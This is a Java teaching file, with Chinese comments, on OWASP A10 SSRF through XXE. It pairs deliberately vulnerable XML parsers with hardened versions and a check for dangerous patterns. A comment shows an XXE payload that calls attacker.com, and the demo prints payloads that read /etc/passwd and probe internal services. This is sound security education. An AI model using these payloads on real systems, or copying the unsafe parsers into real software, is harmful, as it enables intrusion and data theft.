package com.example.owasp.a10.ssrf;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import java.io.StringReader;
import org.xml.sax.InputSource;

/**
 * A10:2021 – Server-Side Request Forgery (SSRF)
 * 漏洞示例6：通过 XXE (XML External Entity) 引起的 SSRF
 * 当 XML 解析器允许外部实体时，可以导致 SSRF 攻击
 */
public class SSRFViaXXE {
    
    /**
     * 漏洞代码：不安全的 XML 解析，允许外部实体
     * 攻击示例 XML：
     * <!DOCTYPE foo [
     *   <!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">
     * ]>
     * <foo>&xxe;</foo>
     */
    public static void parseXmlVulnerableToXXE(String xmlContent) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            
            // 漏洞：没有禁用外部实体和 DTD
            DocumentBuilder builder = factory.newDocumentBuilder();
            
            InputSource inputSource = new InputSource(new StringReader(xmlContent));
            Document doc = builder.parse(inputSource);
            
            System.out.println("XML parsed: " + doc.getDocumentElement().getTagName());
            
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    
    /**
     * 漏洞代码2：SOAP 请求中的 XXE
     * 攻击可以读取本地文件或进行 SSRF
     */
    public static String parseSoapWithXXEVulnerable(String soapContent) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            
            InputSource inputSource = new InputSource(new StringReader(soapContent));
            Document doc = builder.parse(inputSource);
            
            return doc.getDocumentElement().getTextContent();
            
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * 改进版本1：禁用所有危险的 XML 特性
     */
    public static void parseXmlSecure(String xmlContent) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            
            // 禁用 DOCTYPE 声明
            factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            
            // 禁用外部常规实体
            factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
            
            // 禁用外部参数实体
            factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            
            // 禁用外部 DTD
            factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
            
            // 禁用 XInclude
            factory.setXIncludeAware(false);
            
            // 禁用 XML 外部基础
            factory.setExpandEntityReferences(false);
            
            DocumentBuilder builder = factory.newDocumentBuilder();
            
            InputSource inputSource = new InputSource(new StringReader(xmlContent));
            Document doc = builder.parse(inputSource);
            
            System.out.println("XML parsed securely: " + doc.getDocumentElement().getTagName());
            
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    
    /**
     * 改进版本2：使用 SAX 解析器（默认更安全）
     */
    public static void parseXmlWithSAX(String xmlContent) {
        try {
            org.xml.sax.XMLReader xmlReader = org.xml.sax.XMLReaderFactory.createXMLReader();
            
            // 禁用外部实体
            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            xmlReader.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
            
            // 禁用 XXE
            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            
            MyContentHandler handler = new MyContentHandler();
            xmlReader.setContentHandler(handler);
            
            org.xml.sax.InputSource inputSource = new org.xml.sax.InputSource(new StringReader(xmlContent));
            xmlReader.parse(inputSource);
            
            System.out.println("XML parsed with SAX");
            
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
    
    /**
     * 改进版本3：验证 XML 内容后再处理
     */
    public static String parseAndValidateXml(String xmlContent) {
        try {
            // 第一步：基础安全检查
            if (containsDangerousPatterns(xmlContent)) {
                throw new SecurityException("XML contains dangerous patterns");
            }
            
            // 第二步：使用安全的解析器
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            
            // 禁用所有危险特性
            disableXXEFeatures(factory);
            
            DocumentBuilder builder = factory.newDocumentBuilder();
            
            // 第三步：限制 XML 大小
            if (xmlContent.length() > 1024 * 1024) { // 1MB limit
                throw new SecurityException("XML content too large");
            }
            
            InputSource inputSource = new InputSource(new StringReader(xmlContent));
            Document doc = builder.parse(inputSource);
            
            return doc.getDocumentElement().getTextContent();
            
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * 禁用 XXE 相关的特性
     */
    private static void disableXXEFeatures(DocumentBuilderFactory factory) throws Exception {
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
    }
    
    /**
     * 检查 XML 是否包含危险模式
     */
    private static boolean containsDangerousPatterns(String xmlContent) {
        return xmlContent.contains("<!DOCTYPE") ||
               xmlContent.contains("<!ENTITY") ||
               xmlContent.contains("SYSTEM") ||
               xmlContent.contains("PUBLIC") ||
               xmlContent.contains("<![CDATA[");
    }
    
    /**
     * 简单的 SAX 内容处理器
     */
    static class MyContentHandler extends org.xml.sax.helpers.DefaultHandler {
        @Override
        public void startElement(String uri, String localName, String qName, 
                                org.xml.sax.Attributes attributes) {
            System.out.println("Element: " + qName);
        }
    }
    
    public static void main(String[] args) {
        System.out.println("=== SSRF via XXE Demo ===\n");
        
        System.out.println("=== Attack Example ===");
        System.out.println("<!DOCTYPE foo [");
        System.out.println("  <!ENTITY xxe SYSTEM \"http://localhost:6379/\">");
        System.out.println("]>");
        System.out.println("<foo>&xxe;</foo>\n");
        
        System.out.println("=== Attack Variations ===");
        System.out.println("1. File read: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">");
        System.out.println("2. SSRF: <!ENTITY xxe SYSTEM \"http://192.168.1.1:8080/admin/\">");
        System.out.println("3. XXE blind: Exfiltrate via out-of-band channel\n");
        
        System.out.println("=== Secure Practices ===");
        System.out.println("1. Disable DOCTYPE declarations");
        System.out.println("2. Disable external entities");
        System.out.println("3. Disable entity expansion");
        System.out.println("4. Use secure XML libraries (e.g., XOM)");
        System.out.println("5. Validate XML schema");
        System.out.println("6. Limit XML size");
    }
}
